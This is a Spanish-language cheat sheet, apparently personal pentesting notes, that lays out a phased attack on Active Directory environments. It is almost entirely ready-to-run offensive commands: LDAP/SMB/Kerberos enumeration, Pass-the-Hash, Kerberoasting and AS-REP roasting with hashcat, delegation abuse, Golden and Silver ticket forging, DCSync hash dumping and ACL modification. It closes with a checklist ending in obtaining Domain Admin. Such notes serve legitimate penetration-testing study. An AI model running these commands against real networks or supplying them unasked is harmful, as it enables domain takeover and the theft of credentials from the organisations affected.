

> [!info] Objetivo
> Guía concisa para atacar entornos Active Directory: enumeración, explotación y movimiento lateral.

---

## Fase 1: Reconocimiento

> [!tip] Descubrir el dominio

```bash
# DNS
nslookup <target>
nslookup -type=SRV _ldap._tcp.<domain>
nslookup -type=SRV _kerberos._tcp.<domain>

# Nmap
nmap -p 389,636,88,445,3268,3269 <target>
nmap -p 389,636,88,445 --script ldap*,smb* <target>
```

---

## Fase 2: Enumeración

> [!important] Mapear usuarios, grupos y servicios

### LDAP

```bash
# Anonymous bind
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>"

# Con credenciales
ldapsearch -x -H ldap://<target> -D "user@<domain>" -w <pass> -b "DC=<domain>,DC=<tld>"

# Users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName

# Groups
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn
```

### BloodHound

```bash
# Recopilar datos
bloodhound-python -u user -p pass -d <domain> -c All -ns <target>

# Sharphound
.\SharpHound.exe -c All -d <domain>

# neo4j
sudo neo4j console
```

### SMB

```bash
# Enumeración
enum4linux -a //<target>
crackmapexec smb <target> -u user -p pass --shares
smbclient -L //<target> -U user%pass

# Users
crackmapexec smb <target> -u user -p pass --users
```

### Kerberos

```bash
# Users
impacket-GetUserSPNs <domain>/user:pass -dc-ip <target> -request

# AS-REP
impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -format hashcat -outputfile asrep.txt
```

---

## Fase 3: Explotación

> [!danger] Obtener acceso

### Pass-the-Hash

```bash
# SMB
crackmapexec smb <target> -u user -H <NTLM_HASH>

# PSExec
impacket-psexec -hashes :<NTLM_HASH> user@<target>

# WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> user@<target>
```

### Kerberoasting

```bash
# Obtener tickets
impacket-GetUserSPNs <domain>/user:pass -request

# Crackear
hashcat -m 13100 tickets.txt rockyou.txt
john --format=krb5tgs tickets.txt
```

### AS-REP Roasting

```bash
# Obtener hashes
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat

# Crackear
hashcat -m 18200 asrep.txt rockyou.txt
```

### Pass-the-Ticket

```bash
# Importar ticket
export KRB5CCNAME=/tmp/ticket.ccache

# Usar
impacket-psexec -k -no-pass user@<target>
```

### Unconstrained Delegation

```bash
# Buscar servidores
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Capturar tickets
Rubeus.exe monitor /interval:5 /nowrap
```

### Constrained Delegation

```bash
# Buscar
impacket-findDelegation <domain>/user:pass

# Explotar
impacket-getST -spn cifs/<target> -impersonate administrator <domain>/user:pass
```

---

## Fase 4: Movimiento Lateral

> [!tip] Expandir acceso

### Kerberos

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <domain> -spn cifs/<target> user
```

### DCSync

```bash
# Extraer hashes del DC
impacket-secretsdump <domain>/user:pass@<target> -just-dc-ntlm

# Con Pass-the-Hash
impacket-secretsdump -hashes :<NTLM_HASH> <domain>/user@<target>
```

### ACL Abuse

```bash
# Buscar ACLs
bloodyAD -d <domain> -u user -p pass --host <target> get writable --otype user

# Modificar propiedades
bloodyAD -d <domain> -u user -p pass --host <target> set object target user msDS-AllowedToDelegateTo
```

---

## Fase 5: Dominio Completo

> [!warning] Conseguir Domain Admin

### Ruta Típica

```
1. User credenciales → Kerberoasting → Hash cracking
2. Service account → DCSync → KRBTGT hash
3. KRBTGT hash → Golden Ticket → Domain Admin
4. Domain Admin → DCSync → Todos los hashes
```

### Herramientas

```bash
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainGroup
Get-DomainComputer

# ADRecon
.\ADRecon.ps1

# PingCastle
.\pingcastle.exe
```

---

## Referencia Rápida

| Objetivo | Herramienta |
|----------|-------------|
| Users | `ldapsearch`, `crackmapexec --users` |
| Groups | `ldapsearch`, `BloodHound` |
| Services | `nmap`, `BloodHound` |
| Hashes | `impacket-secretsdump`, `hashcat` |
| Tickets | `impacket-GetUserSPNs`, `Rubeus` |
| Delegation | `impacket-findDelegation`, `Rubeus` |
| ACLs | `bloodyAD`, `PowerView` |

---

#checklist
- [ ] Dominio identificado
- [ ] Usuarios enumerados
- [ ] Kerberoasting/AS-REP intentado
- [ ] Pass-the-Hash probado
- [ ] Delegation verificada
- [ ] Domain Admin obtenido



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../comandos/Tmux.md|Tmux]] — Linux, Redes, Tmux
- [[../comandos/Linux.md|Linux]] — Linux, Redes, Tmux
- [[../../apuntes evolve/BLOQUE 10.md|BLOQUE 10]] — Linux, Redes, Tmux
- [[../../comandos/Windows.md|Windows]] — Linux, Redes, Tmux
- [[../comandos/Windows.md|Windows]] — Redes, Tmux, Windows
- [[../../comandos/John_Hashcat.md|John_Hashcat]] — Linux, Redes, Tmux

### 🛠️ Herramientas

- [[comandos/Tmux|Tmux]]

> #linux #redes #tmux #windows
